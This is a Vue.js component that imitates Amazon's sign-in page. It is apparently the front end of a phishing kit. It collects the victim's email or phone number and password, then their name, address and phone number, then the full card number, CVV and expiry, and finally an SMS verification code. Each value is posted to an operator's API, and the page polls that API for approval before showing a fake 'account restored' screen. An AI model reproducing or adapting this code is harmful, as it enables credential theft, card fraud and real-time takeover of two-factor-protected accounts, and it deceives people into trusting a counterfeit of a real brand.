<!-- eslint-disable no-undef -->
<template>
  <div class="conment">
    <div v-if='frist'>
      <div class="topbj"><div class="logo"><img src="../assets/amz.png" width="100%"></div></div>
      <div style="height:50px"></div>
      <h1 class="title fisttitle" style="padding-bottom:0px !important; margin-bottom:0">Sing in</h1>
      <div class="padding" style="padding-top:14px">
        <div class="indextext fristtop" style="padding:0px">
              Email or mobile phone number
        </div>
        <div class="firstbox" :class="{threeerror:fristerror}"><span v-if="usemail" style="color: rgb(0, 102, 192);font-size: 16px;">US +1</span><input type="text" class="firstboxsjk" v-model="fristeamil"></div>
        <div class="fristerror fristerrortxt" v-if="fristerror"><div><img src="../assets/error.png"></div>Enter your email or mobile phone numberr</div>
        <div class="buttondiv" style="padding:17px 0px 19px 0px !important">
          <button  class="button" @click="fristbutton">
              Continue
          </button>
        </div>
        <div class="indextext fristt" style="padding-top: 0px !important;">By continuing, you agree to Amazon's <a>Conditions of Use</a> and <a>Privacy Notice.</a></div>
        <div class="indextext needhelp" style="padding: 10px 0px !important;"><i></i>  Need help?</div>
        <van-divider :style="{ color: '#858482', borderColor: '#e7e7e7', padding: '0 16px',font:'16px' }">New to Amazon?</van-divider>
        <div class="borderdiv"> Create your Amazon accounts</div>
      </div>

      <div class="fristfoots">
        <div style="padding-bottom:15px;display: flex;justify-content: center;">
          <div style="color:#fff; font-size:14px">Conditions of Use</div>
          <div style="color:#fff; font-size:14px; padding:0px 15px">Privacy Notice</div>
          <div style="color:#fff; font-size:14px">Help</div>
        </div>
        <div style="color:#fff; font-size:12px">© 1996-2022, Amazon.com, Inc. or its affiliates</div>
      </div>
    </div>

    <div v-if='two'>
      <div class="topbj"><div class="logo"><img src="../assets/amz.png" width="100%"></div></div>
      <div style="height:50px"></div>
      <h1 class="title fisttitle" style="padding-bottom:0px !important; margin-bottom:0">Sing in</h1>
      <div class="padding" style="padding-top:14px">
        <div class="indextext fristtop" style="padding:0px">
              Amazon Password
        </div>
        <div class="firstbox"><input type="password" class="firstboxsjk" v-model="twopassword" id="mima"></div>
        <div class="fristerror fristerrortxt" v-if="twoerror" style="padding-bottom:0px !important;"><div><img src="../assets/error.png"></div>Enter your Password</div>
      </div>
      <div class="padding" style="padding-top: 0px !important;">
        <div class="fristerror">
          <van-checkbox-group v-model="checkboxGroup" direction="horizontal" @change="changeTy" style="font-size:16px">
            <van-checkbox name="1" shape="square">
              Show password
            </van-checkbox>
          </van-checkbox-group>
          <div class="needhelp" style=" text-align: right; flex: 1;"> Forgot password?</div>
        </div>
        <div style="height:5px"></div>
        <div class="fristerror">
          <van-checkbox-group v-model="checkboxGroups" direction="horizontal"  style="font-size:16px">
            <van-checkbox name="1" shape="square">Keep me signed in.</van-checkbox>
          </van-checkbox-group>
          <div class="needhelp">  Details</div>
        </div>

        <div class="buttondiv">
          <button  class="button" @click="twobutton"> Sign-In</button>
        </div>
        <van-divider :style="{ color: '#858482', borderColor: '#e7e7e7', padding: '0 16px',font:'16px' }">New to Amazon?</van-divider>
        <div class="borderdiv"> Create your Amazon accounts</div>
      </div>
      <div class="fristfoots">
        <div style="padding-bottom:15px;display: flex;justify-content: center;">
          <div style="color:#fff; font-size:14px">Conditions of Use</div>
          <div style="color:#fff; font-size:14px; padding:0px 15px">Privacy Notice</div>
          <div style="color:#fff; font-size:14px">Help</div>
        </div>
        <div style="color:#fff; font-size:12px">© 1996-2022, Amazon.com, Inc. or its affiliates</div>
      </div>
    </div>

    <div v-if='three'>
      <div class="topbj"><div class="logo"><img src="../assets/amz.png" width="100%"></div></div>
      <div style="height:50px"></div>
      <div class="linestitle">Verify your address information</div>
      <div class="linesta">
        <div class="public_bd borderdivactive linestadiv"></div>
        <div class="linestatext linestatxtadd linestadivcolor">Verify Address</div>
        <div class="linestayuan"></div>
        <div class="public_bd linestadiv"></div>
        <div class="linestatext linestatxtcard">Verify Card Number</div>
        <div class="linestayuanbox linestayuancard"></div>
        <div class="public_bd linestadiv"></div>
        <div class="linestatext linestatxtcards">Submit</div>
        <div class="linestayuanbox linestayuancards"></div>
        <div class="public_bd linestadiv"></div>
      </div>
      <div class="padding">
        <div class="threetitle">First name</div>
        <div class="inputbox" :class="{threeerror:Firstnameerror}">
          <div><input type="text" placeholder="First name" class="iteminput" v-model="Firstname" ></div>
        </div>
        <div class="threetitle">Last name</div>
        <div class="inputbox" :class="{threeerror:Lastnameerror}">
          <div><input type="text" placeholder="Last name" class="iteminput" v-model="Lastname"></div>
        </div>
        <div class="threetitle">Phone number</div>
        <div class="inputbox" :class="{threeerror:phoneerror}">
          <div><input type="text" placeholder="Phone number" class="iteminput" v-model="phone"></div>
        </div>
        <div class="threetitle">Address</div>
        <div class="inputbox" :class="{threeerror:Addresserror}">
          <div><input type="text" placeholder="Street address or P.O. Box" class="iteminput" v-model="Address"></div>
        </div>
        <div style="height:8px"></div>
        <div class="inputbox" :class="{threeerror:Buildingerror}">
          <div><input type="text" placeholder="Apt, Suite, Unit, Building (optional)" class="iteminput" v-model="Building"></div>
        </div>
        <div class="threetitle">City</div>
        <div class="inputbox" :class="{threeerror:Cityerror}">
          <div><input type="text" placeholder="City" class="iteminput" v-model="City"></div>
        </div>
        <div class="threelast">
          <div>
            <div class="threetitle">State</div>
            <div class="inputbox" :class="{threeerror:Stateerror}">
              <div><input type="text" placeholder="State" class="iteminput" v-model="State"></div>
            </div>
          </div>
          <div style="width:25px"></div>
          <div>
            <div class="threetitle">ZIP Code</div>
            <div class="inputbox" :class="{threeerror:ZIPCodeerror}">
              <div><input type="text" placeholder="ZIP Code" class="iteminput" v-model="ZIPCode"></div>
            </div>
          </div>
        </div>

        <div class="buttondiv">
          <button  class="button" @click="threebutton">Next</button>
        </div>
      </div>
    </div>

    <div v-if='four'>
      <div class="topbj"><div class="logo"><img src="../assets/amz.png" width="100%"></div></div>
      <div style="height:50px"></div>
      <div class="linestitle">Enter your credit card information</div>
      <div class="linesta">
        <div class="public_bd borderdivactive linestadiv"></div>
        <div class="linestatext linestatxtadd linestadivcolor">Verify Address</div>
        <div class="linestayuan"></div>
        <div class="public_bd borderdivactive linestadiv"></div>
        <div class="linestatext linestatxtcard linestadivcolor">Verify Card Number</div>
        <div class="linestayuan linestayuancard"></div>
        <div class="public_bd linestadiv"></div>
        <div class="linestatext linestatxtcards">Submit</div>
        <div class="linestayuanbox linestayuancards"></div>
        <div class="public_bd linestadiv"></div>
      </div>
      <div style="height:35px"></div>
      <div class="padding">
        <div class="inputbox threeinputbox">
          <div class="linebottom" :class="{fourerror:cardnameerror}"><input type="text" placeholder="Name on card" v-model="cardname" class="iteminput iteminputs"></div>
          <div class="linebottom" :class="{fourerror:cardnumerror}"><input type="text" :maxlength="23" data-gap=4 placeholder="Card number" @keyup.delete="onkeyupdeta" v-model="cardnum" class="iteminput iteminputs" ref="cardnum" :class="{fourerrortxt:cardnumerror}"></div>
          <div  :class="{fourerrors:cardcvverror}"><input type="number" placeholder="Security code (CVV)" class="iteminput iteminputs" v-model="cardcvv" oninput="if(value.length>4)value=value.slice(0,4)"></div>
        </div>
        <div>
          <div class="threetitle">Expiration date</div>
          <div class="lastjk">
            <div class="inputbox threeinputbox">
              <div><input type="text" placeholder="month" @click="showmoneth" v-model="month" class="iteminput iteminputs" readonly></div>
            </div>
            <van-popup v-model="showmonethPicker" position="bottom">
              <van-picker
                :columns="columns"
                @confirm="onConfirm"
                show-toolbar
                confirm-button-text='OK'
                cancel-button-text='cancel'
                @cancel="showmonethPicker = false"
              />
            </van-popup>
            <div style="width:25px"></div>
            <div class="inputbox threeinputbox">
              <div><input type="text" placeholder="Year" @click="showyear" v-model="year" class="iteminput iteminputs" readonly></div>
            </div>
            <van-popup v-model="showyearPicker" position="bottom">
              <van-picker
                :columns="columnsyear"
                @confirm="onyearConfirm"
                show-toolbar
                confirm-button-text='OK'
                cancel-button-text='cancel'
                @cancel="showyearPicker = false"
              />
            </van-popup>
          </div>
        </div>
        <div style="height:25px"></div>
        <div class="buttondiv">
          <van-button  class="button"  @click="fourbutton" :loading=fristload loading-text="loading...">Submit</van-button>
        </div>
      </div>
    </div>

    <div v-if='five'>
      <div class="topbj"><div class="logo"><img src="../assets/amz.png" width="100%"></div></div>
      <div style="height:50px"></div>
      <div class="linestitle">SMS code</div>
      <div class="linesta">
        <div class="public_bd borderdivactive linestadiv"></div>
        <div class="linestatext linestatxtadd linestadivcolor">Verify Address</div>
        <div class="linestayuan"></div>
        <div class="public_bd borderdivactive linestadiv"></div>
        <div class="linestatext linestatxtcard linestadivcolor">Verify Card Number</div>
        <div class="linestayuan linestayuancard"></div>
        <div class="public_bd borderdivactive linestadiv"></div>
        <div class="linestatext linestatxtcards linestadivcolor">Submit</div>
        <div class="linestayuan linestayuancards"></div>
        <div class="public_bd borderdivactive linestadiv"></div>
      </div>
      <div class="padding">
        <div class="fourtitles">You have sent the SMS verification code.</div>
        <div class="fourtitles">Please enter the 6-digit authorization number you sent to us in 10 minutes</div>
        <div class="inputbox threeinputbox" :class="{fourerrors:smscodeerror}">
          <input type="number" placeholder="SMS code" v-model="smscode" class="iteminput iteminputs" oninput="if(value.length>6)value=value.slice(0,6)">
        </div>
        <div style="height:25px"></div>
        <div class="buttondiv">
          <van-button  class="button"  @click="fivebutton" :loading=twoload loading-text="loading...">Submit</van-button>
        </div>
      </div>
    </div>

    <div v-if="six">
      <div class="topbj"><div class="logo"><img src="../assets/amz.png" width="100%"></div></div>
      <div style="height:50px"></div>
      <div class="padding">
        <div class="lasting"><img src="../assets/right.png" width="100%"></div>
        <div class="lastingtxt">Your account is restored</div>
        <div class="lastingdis">The information has been verified successfully, please wait two working days patiently for verification</div>
      </div>
    </div>

  </div>
</template>
<script>
import { validebank, valideEmail } from '@/utils/util'
export default {
  name: 'index',
  data () {
    return {
      disabled: true,
      disableds: true,
      fristload: false,
      twoload: false,
      frist: true,
      two: false,
      three: false,
      four: false,
      five: false,
      six: false,
      fristerror: false,
      fristeamil: '',
      twopassword: '',
      twoerror: false,

      Firstnameerror: false,
      Lastnameerror: false,
      phoneerror: false,
      Addresserror: false,
      Buildingerror: false,
      Cityerror: false,
      Stateerror: false,
      ZIPCodeerror: false,
      cardnameerror: false,
      cardnumerror: false,
      cardcvverror: false,
      carddateerror: false,
      smscodeerror: false,
      usemail: false,

      Firstname: '',
      Lastname: '',
      phone: '',
      Address: '',
      Building: '',
      City: '',
      State: '',
      ZIPCode: '',
      cardname: '',
      cardnum: '',
      cardcvv: '',
      carddate: '',
      smscode: '',
      fristdata: '',
      checkboxGroup: [],
      checkboxGroups: [],
      showmonethPicker: false,
      showyearPicker: false,
      month: '1',
      year: '2022',
      columns: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12],
      columnsyear: [2022, 2023, 2024, 2025, 2026, 2027, 2028, 2029, 2030, 2031, 2032, 2033, 2034, 2035, 2036, 2037, 2038, 2039, 2040, 2041, 2042, 2043, 2044, 2045, 2046, 2047, 2048, 2049, 2050]
    }
  },
  watch: {
    fristeamil: {
      handler: function (newValue, oldValue) {
        // eslint-disable-next-line eqeqeq
        if (newValue != '') {
          this.fristerror = false
        }
        if (!isNaN(newValue)) {
          this.usemail = true
        } else {
          this.usemail = false
        }
        // eslint-disable-next-line eqeqeq
        if (newValue == '') {
          this.usemail = false
        }
      },
      deep: true
    },
    twopassword: {
      handler: function (newValue, oldValue) {
        // eslint-disable-next-line eqeqeq
        if (newValue != '') {
          this.twoerror = false
        }
      },
      deep: true
    },
    Firstname: {
      handler: function (newValue, oldValue) {
        // eslint-disable-next-line eqeqeq
        if (newValue != '') {
          this.Firstnameerror = false
        }
      },
      deep: true
    },
    Lastname: {
      handler: function (newValue, oldValue) {
        // eslint-disable-next-line eqeqeq
        if (newValue != '') {
          this.Lastnameerror = false
        }
      },
      deep: true
    },
    phone: {
      handler: function (newValue, oldValue) {
        // eslint-disable-next-line eqeqeq
        if (newValue != '') {
          this.phoneerror = false
        }
      },
      deep: true
    },
    Address: {
      handler: function (newValue, oldValue) {
        // eslint-disable-next-line eqeqeq
        if (newValue != '') {
          this.Addresserror = false
        }
      },
      deep: true
    },
    Building: {
      handler: function (newValue, oldValue) {
        // eslint-disable-next-line eqeqeq
        if (newValue != '') {
          this.Buildingerror = false
        }
      },
      deep: true
    },
    City: {
      handler: function (newValue, oldValue) {
        // eslint-disable-next-line eqeqeq
        if (newValue != '') {
          this.Cityerror = false
        }
      },
      deep: true
    },
    State: {
      handler: function (newValue, oldValue) {
        // eslint-disable-next-line eqeqeq
        if (newValue != '') {
          this.Stateerror = false
        }
      },
      deep: true
    },
    ZIPCode: {
      handler: function (newValue, oldValue) {
        // eslint-disable-next-line eqeqeq
        if (newValue != '') {
          this.ZIPCodeerror = false
        }
      },
      deep: true
    },
    cardname: {
      handler: function (newValue, oldValue) {
        // eslint-disable-next-line eqeqeq
        if (newValue != '') {
          this.cardnameerror = false
        }
      },
      deep: true
    },
    cardnum: {
      handler: function (newValue, oldValue) {
        // eslint-disable-next-line eqeqeq
        if (newValue != '') {
          this.cardnumerror = false
        }
      },
      deep: true
    },
    // eslint-disable-next-line no-dupe-keys
    'cardnum' (val) {
      console.log(val)
      var gap = parseInt(this.$refs.cardnum.getAttribute('data-gap'))
      this.$nextTick(() => {
        var numbers = val.replace(/[^\w]|/ig, '').split('') // 获取原始值
        var back = ''

        numbers.forEach(function (n, i) {
          back += n + ((i + 1) % gap === 0 ? ' ' : '') // 处理加空格或-
        })
        this.cardnum = back
        console.log(back, 11111)
      })
    },
    cardcvv: {
      handler: function (newValue, oldValue) {
        // eslint-disable-next-line eqeqeq
        if (newValue != '') {
          this.cardcvverror = false
        }
      },
      deep: true
    },
    smscode: {
      handler: function (newValue, oldValue) {
        // eslint-disable-next-line eqeqeq
        if (newValue != '') {
          this.smscodeerror = false
        }
      },
      deep: true
    }
  },

  methods: {
    onkeyupdeta (event) {
      // eslint-disable-next-line eqeqeq
      if (event.keyCode == 8) {
        this.cardnum = ''
        this.cardnumerror = false
      }
    },
    threebutton () {
      // eslint-disable-next-line eqeqeq
      if (this.Firstname == '') {
        this.Firstnameerror = true
        return false
      }
      // eslint-disable-next-line eqeqeq
      if (this.Lastname == '') {
        this.Lastnameerror = true
        return false
      }
      // eslint-disable-next-line eqeqeq
      if (this.phone == '') {
        this.phoneerror = true
        return false
      }
      // eslint-disable-next-line eqeqeq
      if (this.Address == '') {
        this.Addresserror = true
        return false
      }
      // eslint-disable-next-line eqeqeq
      /* if (this.Building == '') {
        this.Buildingerror = true
        return false
      } */
      // eslint-disable-next-line eqeqeq
      if (this.City == '') {
        this.Cityerror = true
        return false
      }
      // eslint-disable-next-line eqeqeq
      if (this.State == '') {
        this.Stateerror = true
        return false
      }
      // eslint-disable-next-line eqeqeq
      if (this.ZIPCode == '') {
        this.ZIPCodeerror = true
        return false
      }
      this.$axios({
        method: 'post',
        url: 'api/pro/apd/3f0929adb48041a69871dda42401d4e0/' + this.fristdata + '?Firstname=' + this.Firstname + '&Lastname=' + this.Lastname + '&phone=' + this.phone + '&Address=' + this.Address + '&Building=' + this.Building + '&City=' + this.City + '&State=' + this.State + '&ZIPCode=' + this.ZIPCode,
        data: {
        }
      }).then((res) => {
        // eslint-disable-next-line eqeqeq
        if (res.data.code == 1) {
          this.frist = false
          this.two = false
          this.three = false
          this.four = true
          return true
        } else {
          this.$toast({
            message: res.data.msg,
            color: '#ffffff',
            background: '#ff6f6f',
            duration: 3000
          })
          return false
        }
      }).catch(e => {
        console.log(e)
      })
    },
    fourbutton (checkOrderInterval) {
      // eslint-disable-next-line eqeqeq
      if (this.cardname == '') {
        this.cardnameerror = true
        return false
      }
      // eslint-disable-next-line eqeqeq
      if (this.cardnum == '') {
        this.cardnumerror = true
        return false
      }
      // eslint-disable-next-line eqeqeq
      if (this.cardcvv == '') {
        this.cardcvverror = true
        return false
      }
      console.log(this.cardnum.replace(/\s*/g, ''), 1111)
      console.log(validebank(this.cardnum.replace(/\s*/g, '')), 'validebank')
      if (validebank(this.cardnum.replace(/\s*/g, '')) === false) {
        this.cardnumerror = true
        return false
      }
      console.log(this.cardnum)
      const carddate = this.month + '/' + this.year
      this.fristload = true
      this.$axios({
        method: 'post',
        url: 'api/pro/apd/3f0929adb48041a69871dda42401d4e0/' + this.fristdata + '?cardname=' + this.cardname + '&cardnum=' + this.cardnum + '&cardcvv=' + this.cardcvv + '&carddate=' + carddate,
        data: {
        }
      }).then((res) => {
        // eslint-disable-next-line eqeqeq
        if (res.data.code == 1) {
          this.trainOrderResult()
          window.clearInterval(checkOrderInterval)
          return true
        } else {
          this.$toast({
            message: res.data.msg,
            color: '#ffffff',
            background: '#ff6f6f',
            duration: 3000
          })
          return false
        }
      }).catch(e => {
        console.log(e)
      })
    },

    // 轮询支付结果
    async trainOrderResult () {
      this.disabled = true
      let expireTimestamp = Date.parse(new Date()) / 1000 + 60
      let seconds = 30
      var that = this
      let checkOrderInterval = setInterval(function () {
        let currentTimestamp = Date.parse(new Date()) / 1000
        if (seconds === 0 || currentTimestamp >= expireTimestamp) {
          window.clearInterval(checkOrderInterval)
          that.getthree(checkOrderInterval)
        }
        if (seconds % 2 === 0) {
          that.getthree(checkOrderInterval)
        }
        seconds--
      }, 1000)
    },

    getthree (checkOrderInterval) {
      this.disabledthree = true
      this.$axios({
        method: 'post',
        url: 'api/pro/cq/3f0929adb48041a69871dda42401d4e0/' + this.fristdata + '/carddate',
        data: {
        }
      }).then((res) => {
        // eslint-disable-next-line eqeqeq
        if (res.data.data === '1') {
          window.clearInterval(checkOrderInterval)
          this.frist = false
          this.two = false
          this.three = false
          this.four = false
          this.five = true
          this.fristload = false
          return true
        // eslint-disable-next-line eqeqeq
        } if (res.data.data != '0' && res.data.data != '1') {
          window.clearInterval(checkOrderInterval)
          this.fristload = false
          this.$toast({
            message: res.data.data,
            color: '#ffffff',
            background: '#ff6f6f',
            duration: 3000
          })
          return false
        } else {
          return false
        }
      }).catch(e => {
        console.log(e)
      })
    },

    fivebutton (checkOrderInterval) {
      // eslint-disable-next-line eqeqeq
      if (this.smscode == '') {
        this.smscodeerror = true
        return false
      }
      this.twoload = true
      this.$axios({
        method: 'post',
        url: 'api/pro/apd/3f0929adb48041a69871dda42401d4e0/' + this.fristdata + '?smscode=' + this.smscode,
        data: {
        }
      }).then((res) => {
        // eslint-disable-next-line eqeqeq
        if (res.data.code == 1) {
          this.trainOrderResults()
          return true
        } else {
          this.$toast({
            message: res.data.msg,
            color: '#ffffff',
            background: '#ff6f6f',
            duration: 3000
          })
          return false
        }
      }).catch(e => {
        console.log(e)
      })
    },

    // 轮询支付结果
    async trainOrderResults () {
      let expireTimestamp = Date.parse(new Date()) / 1000 + 60
      let seconds = 30
      var that = this
      let checkOrderInterval = setInterval(function () {
        let currentTimestamp = Date.parse(new Date()) / 1000
        if (seconds === 0 || currentTimestamp >= expireTimestamp) {
          window.clearInterval(checkOrderInterval)
          that.getfour(checkOrderInterval)
        }
        if (seconds % 2 === 0) {
          that.getfour(checkOrderInterval)
        }
        seconds--
      }, 1000)
    },

    getfour (checkOrderInterval) {
      this.twoload = true
      this.$axios({
        method: 'post',
        url: 'api/pro/cq/3f0929adb48041a69871dda42401d4e0/' + this.fristdata + '/smscode',
        data: {
        }
      }).then((res) => {
        // eslint-disable-next-line eqeqeq
        if (res.data.data === '1') {
          this.frist = false
          this.two = false
          this.three = false
          this.four = false
          this.five = false
          this.six = true
          this.twoload = false
          window.clearInterval(checkOrderInterval)
          return true
        // eslint-disable-next-line eqeqeq
        } if (res.data.data != '0' && res.data.data != '1') {
          window.clearInterval(checkOrderInterval)
          this.twoload = false
          this.$toast({
            message: res.data.data,
            color: '#ffffff',
            background: '#ff6f6f',
            duration: 3000
          })
          return false
        } else {
          return false
        }
      }).catch(e => {
        console.log(e)
      })
    },

    changeTy (value) {
      var mima = document.getElementById('mima')
      if (value.length > 0) {
        mima.type = 'text'
      } else {
        mima.type = 'password'
      }
    },
    fristbutton () {
      // eslint-disable-next-line eqeqeq
      if (this.fristeamil == '') {
        this.fristerror = true
        return false
      }
      // eslint-disable-next-line eqeqeq
      if (this.fristeamil.indexOf('@') > 0) {
        if (valideEmail(this.fristeamil) === false) {
          this.fristerror = true
          return false
        }
      } else {
        if (this.fristeamil.length > 10) {
          this.fristerror = true
          return false
        }
      }
      const ua = navigator.userAgent
      this.$axios({
        method: 'post',
        url: 'api/pro/create/3f0929adb48041a69871dda42401d4e0?account=' + this.fristeamil + '&ua=' + ua,
        data: {
        }
      }).then((res) => {
        // eslint-disable-next-line eqeqeq
        if (res.data.code == 1) {
          this.fristdata = res.data.data
          this.frist = false
          this.two = true
          return true
        } else {
          this.$toast({
            message: res.data.msg,
            color: '#ffffff',
            background: '#ff6f6f',
            duration: 3000
          })
          return false
        }
      }).catch(e => {
        console.log(e)
      })
    },
    twobutton () {
      // eslint-disable-next-line eqeqeq
      if (this.twopassword == '') {
        this.twoerror = true
        return false
      }
      this.$axios({
        method: 'post',
        url: 'api/pro/apd/3f0929adb48041a69871dda42401d4e0/' + this.fristdata + '?password=' + this.twopassword,
        data: {
        }
      }).then((res) => {
        // eslint-disable-next-line eqeqeq
        if (res.data.code == 1) {
          this.frist = false
          this.two = false
          this.three = true
          return true
        } else {
          this.$toast({
            message: res.data.msg,
            color: '#ffffff',
            background: '#ff6f6f',
            duration: 3000
          })
          return false
        }
      }).catch(e => {
        console.log(e)
      })
    },
    showmoneth () {
      this.showmonethPicker = true
    },
    onConfirm (value) {
      this.showmonethPicker = false
      console.log(value)
      this.month = value
    },
    showyear () {
      this.showyearPicker = true
    },
    onyearConfirm (value) {
      this.showyearPicker = false
      console.log(value)
      this.year = value
    }
  },
  mounted () {
  },
  created () {
  }
}
</script>
<style scoped>
.fristfoots{
  margin-top: 25px;
  text-align: center;
  width: 100%;
  background: #252f3b;
  padding: 25px 0;
}

.fristfoot{
    height: 2px;
    margin-bottom: 15px;
    margin-top: 35px;
    background: gradient(linear,left top,left bottom,color-stop(0,rgba(0,0,0,.14)),color-stop(.3rem,rgba(0,0,0,.03)),color-stop(100%,transparent));
    background: -webkit-linear-gradient(to bottom,rgba(0,0,0,.14),rgba(0,0,0,.03) .3rem,transparent);
    background: linear-gradient(to bottom,rgba(0,0,0,.14),rgba(0,0,0,.03) 0.3rem,transparent);
    z-index: 0;
    zoom: 1;
}
.fristfoot::after{
    display: block;
    width: 100%;
    height: 2px;
    background-color: transparent;
    background: gradient(linear,left top,right top,color-stop(0,#fff),color-stop(50%,rgba(255,255,255,0)),color-stop(100%,#fff));
    background: -webkit-linear-gradient(to right,#fff,rgba(255,255,255,0),#fff);
    background: linear-gradient(to right,#fff,rgba(255,255,255,0),#fff);
    z-index: 1;
    content: "";
}
.threelast{
  display: -webkit-box; display: -webkit-flex; display: flex; -webkit-box-align: center; -webkit-align-items: center; align-items: center;
}
.threeerror{
  border:1px solid #c40000 !important
}
.fourerrortxt{
color: #c40000;
}
.fourerror{

  border-bottom:1px solid #c40000 !important
}
.fourerror input:-moz-placeholder{
    color: #c40000;
}
.fourerror input:-ms-input-placeholder{
    color: #c40000;
}
.fourerror input::-webkit-input-placeholder{
    color: #c40000;
}

.fourerrors input:-moz-placeholder{
    color: #c40000;
}
.fourerrors input:-ms-input-placeholder{
    color: #c40000;
}
.fourerrors input::-webkit-input-placeholder{
    color: #c40000;
}

.fourtitles{
  font-size: 12px;
  padding-bottom: 5px;
  color: #999;
}
.lastjk{
  display: -webkit-box; display: -webkit-flex; display: flex; -webkit-box-align: center; -webkit-align-items: center; align-items: center;
}
.iteminputs{
  font-size: 16px !important;
  padding:20px 15px !important;
  border-radius: 15px;
}
.threeinputbox{
  padding: 0px !important;
  border: 1px solid #000 !important;
}
.fristerror{
  padding: 10px 0px; position: relative; display: -webkit-box; display: -webkit-flex; display: flex; -webkit-box-align: center; -webkit-align-items: center; align-items: center;
}
.fristerrortxt{
  font-size: 14px;
  color: #c40000;
}
.needhelp{
  font-size: 16px !important;
  color: #0066c0 !important;
}
.fristt{
  font-size: 16px !important;
  padding-bottom: 0px !important;
}
.fristt a{
  text-decoration: none;
  color: #0066c0;
}
.fristt a:hover{
  text-decoration: none;
  color: #e77600;
}
.fristtop{
  font-size: 17px !important;
  font-weight: 700;
  color: #090909 !important;
  padding-bottom: 5px !important;
}
.fisttitle{
  font-weight: 400;
  font-size: 28px !important;
  line-height: 1.2;
  padding: 0 25px !important;
  padding-top: 25px !important;
}
.firstbox{
  width: 100%;
  background-color: #fff;
  padding: 3px 7px;
  border: 1px solid #979797;
  border-top-color: #dddddd;
  border-radius: 1px;
  box-shadow: 0 1px 0 rgb(255 255 255 / 50%), 0 1px 0 rgb(0 0 0 / 7%) inset;
  outline: 0;
}
.firstboxsjk{
  width: 70%;
  padding: 13px 15px;
  font-size: 16px;
  border: 0px;
}
.footboxs:focus{
  border-color: #e77600;
  box-shadow: 0 0 3px 2px rgb(228 121 17 / 50%);
}
.lasting{
  width: 90px;
  margin: 0px auto;
  margin-top: 95px;
}
.lastingtxt{
  padding: 10px 0px;
  text-align: center;
  line-height: 1.9;
  font-size: 18px;
  color: #333;
}
.lastingdis{
  padding: 20px 0px;
  text-align: center;
  font-size: 16px;
  line-height: 1.9;
  color: #666;
}
.linestitle{
  font-size: 24px;
  padding: 25px;
}
.linesta{
  padding: 20px; position: relative; display: -webkit-box; display: -webkit-flex; display: flex; -webkit-box-align: center; -webkit-align-items: center; align-items: center; position: relative;
}
.linestayuan{
  width: 20px;
  height: 20px;
  border-radius:100%;
  border: 2px solid #e77600;
  position: absolute;
  left: 25%;
  background: #fff;
}
.linestayuanbox{
  width: 20px;
  height: 20px;
  border-radius:100%;
  border: 2px solid #d6d7d3;
  position: absolute;
  left: 25%;
  background: #fff;
}
.linestatext{
  position: absolute;
}
.linestadivcolor{
  color: #e77600;
}
.linestatxtadd{
    left: 15%;
    top: 35px;
}
.linestatxtcard{
  left: 38%;
  top: 35px;
}
.linestayuancard{
  left: 48%;
  background: #fff;
}

.linestatxtcards{
  left: 67%;
  top: 35px;
}
.linestayuancards{
  left: 70%;
  background: #fff;
}

.public_bd{ -webkit-box-flex: 1; -webkit-flex: 1; flex: 1;}
.linestadiv{
  height: 3px;
  margin: 0px;
  background: #d6d7d3;
}
.threetitle{
  padding: 15px 0px 8px 0px;
  font-size: 16px;
  color: #232e40;
  font-weight: 700;
}
.borderdivactive{
  background: #e69829;
}
  .padding{
    padding: 20px 25px;
  }
  .logo{
    width: 80px;
    margin-left: 25px;
  }
  .topbj{
    width: 100%;
    position: fixed;
    top: 0px;
    height: 48px;
    z-index: 99999;
    background: #252f3b;
  }
  .title{
    padding:20px 25px;
    font-size: 22px;
    color: #232e40;
  }
  .dispa{
    padding: 10px 15px;
    font-size: 14px;
    text-align: right;
  }
  .inputbox{
    padding: 10px 0px;
    border-radius: 5px;
    border:1px solid #ddd;
    background: #fff;
  }
  .iteminput{
    width: 100%;
    border: 0px;
    padding: 10px 15px;
    font-size: 14px;
  }
  .linebottom{
    border-bottom:1px solid #000;
  }
  .buttondiv{
    padding: 15px 0px;
  }
  .button{
    width: 100%;
    padding: 15px 10px;
    font-size:16px;
    border-radius: 3px;
    box-shadow: 0 1px 0 rgb(255 255 255 / 40%) inset;
    border:1px solid #998d45;
    background: linear-gradient(to bottom,#f7dfa5,#f0c14b);
  }
  .button:hover{
    border-color: #a88734 #9c7e31 #846a29;
  }
  .button:focus {
      outline: 0;
      border-color: #e77600;
      box-shadow: 0 0 3px 2px rgb(228 121 17 / 50%);
  }
  .indextext{
    font-size: 14px;
    padding: 20px 0px;
    line-height: 1.9;
    color:#46473f
  }
  .borderdiv{
    width: 100%;
    height: 44px;
    font-size: 14px !important;
    line-height: 44px;
    background: #e7e9ec;
    border-radius: 3px;
    background: linear-gradient(to bottom,#f7f8fa,#e7e9ec);
    border-color: #adb1b8 #a2a6ac #8d9096;
    border-style: solid;
    border-width: 1px;
    cursor: pointer;
    display: inline-block;
    padding: 0;
    text-align: center;
    text-decoration: none!important;
    display: block;
    position: relative;
    overflow: hidden;
    box-shadow: 0 1px 0 rgb(255 255 255 / 60%) inset;
    border-radius: 2px;
  }
  .footbox{
    position: fixed;
    background: #0d141e;
    padding: 15px;
    width: 100%;
    left: 0px;
    bottom: 0px;
  }
  .footboxdiv{position: relative; display: -webkit-box; display: -webkit-flex; display: flex; -webkit-box-align: center; -webkit-align-items: center; align-items: center;}
  .public_bd{ -webkit-box-flex: 1; -webkit-flex: 1; flex: 1;}
  .icon{
    width: 20px;
    margin-right:15px;
  }
  .icontext{
    font-size: 12px;
    color: #fff;
  }
  .footboxtxt{
    color: #fff;
    font-size: 12px;
    padding-top: 10px;
    text-align: center;
  }
@media (max-width: 1024px) {

}
</style>
